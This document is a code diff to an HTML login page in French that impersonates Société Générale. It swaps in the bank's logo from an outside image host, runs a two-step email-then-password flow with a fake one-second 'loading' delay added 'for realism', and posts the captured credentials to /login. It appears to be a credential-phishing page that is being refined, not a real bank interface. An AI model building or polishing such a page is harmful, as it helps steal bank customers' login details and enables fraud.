@@ -23,7 +23,7 @@
             justify-content: center;
         }
         .logo-img {
-            height: 40px; /* Ajuste la taille du logo */
+            max-height: 50px; /* Taille adaptée pour qu'elle ne prenne pas trop de place */
             width: auto;
         }
         .container {
@@ -103,7 +103,6 @@
             text-decoration: none;
             margin: 0 5px;
         }
-        /* Classes pour cacher/montrer les étapes */
         .step {
             display: none;
         }
@@ -121,8 +120,8 @@
 <body>
 
     <div class="header">
-        <!-- LOGO OFFICIEL DE SG (Image PNG transparente) -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9b/Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_logo.svg" alt="Société Générale" class="logo-img">
+        <!-- TON IMAGE DE LOGO ICI -->
+        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" alt="Société Générale" class="logo-img">
     </div>
 
     <div class="container">
@@ -144,7 +143,7 @@
                 </div>
             </div>
 
-            <!-- CHARGEMENT (Simulation) -->
+            <!-- CHARGEMENT -->
             <div id="loader" class="loader">
                 Chargement de votre compte...
             </div>
@@ -152,7 +151,7 @@
             <!-- ÉTAPE 2 : MOT DE PASSE -->
             <div id="step2" class="step">
                 <form action="/login" method="POST">
-                    <!-- Champ caché pour sauvegarder l'email -->
+                    <!-- Champ caché pour l'email -->
                     <input type="hidden" name="email" id="hidden_email">
                     
                     <div class="input-group">
@@ -179,19 +178,20 @@
 
     <script>
         function goToStep2(event) {
-            event.preventDefault(); // Empêche le rechargement immédiat
+            event.preventDefault();
             
+            // Récupérer la valeur de l'email
             const emailValue = document.getElementById('email').value;
-            const hiddenEmailInput = document.getElementById('hidden_email');
             
-            // On sauvegarde la valeur de l'email dans le champ caché de l'étape 2
+            // La mettre dans le champ caché pour l'étape 2
+            const hiddenEmailInput = document.getElementById('hidden_email');
             hiddenEmailInput.value = emailValue;
             
-            // Animation de transition
+            // Gestion de l'affichage
             document.getElementById('step1').classList.remove('active');
             document.getElementById('loader').style.display = 'block';
             
-            // Petit délai pour simuler le chargement (1 seconde)
+            // Délai de 1 seconde pour le réalisme
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('step2').classList.add('active');
@@ -201,3 +201,4 @@
 
 </body>
 </html>
+   
